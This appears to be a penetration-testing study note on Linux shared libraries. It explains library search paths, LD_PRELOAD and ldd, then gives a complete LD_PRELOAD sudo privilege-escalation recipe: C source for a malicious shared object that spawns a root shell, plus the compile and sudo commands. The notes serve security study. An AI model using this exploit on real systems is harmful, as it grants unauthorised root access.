# Linux Shared Libraries Attacks

* two types of libraries exist in Linux:&#x20;
  * `static libraries` (denoted by the .a file extension)
  * `dynamically linked shared object libraries` (denoted by the .so file extension)
* There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution.
* This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.
* Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary.
  * The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.

```shell-session
ldd /bin/ls
```

```shell-session
	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

* The code above lists all the libraries required by `/bin/ls`, along with their absolute paths.

### LD\_PRELOAD Privilege Escalation

```shell-session
sudo -l
```

* get the exuctable that can run as root or the user you want to get as

```bash
cd /tmp
nano root.c
```

* root.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```shell-session
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```shell-session
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

* you get shell of that user
